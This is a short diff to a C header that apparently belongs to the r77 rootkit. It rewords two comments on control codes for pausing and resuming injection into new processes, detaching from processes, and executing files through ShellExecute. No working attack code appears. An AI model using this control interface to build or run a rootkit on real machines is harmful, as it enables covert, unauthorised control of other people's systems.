@@ -101,7 +101,7 @@
 /// </summary>
 #define CONTROL_R77_PAUSE_INJECTION				0x1003
 /// <summary>
-/// The control code that resumes paused injection of new processes.
+/// The control code that resumes injection of new processes.
 /// </summary>
 #define CONTROL_R77_RESUME_INJECTION			0x1004
 /// <summary>
@@ -121,7 +121,7 @@
 /// </summary>
 #define CONTROL_PROCESSES_DETACH_ALL			0x2004
 /// <summary>
-/// The control code that executes a file using ShellExec.
+/// The control code that executes a file using ShellExecute.
 /// </summary>
 #define CONTROL_USER_SHELLEXEC					0x3001
 /// <summary>
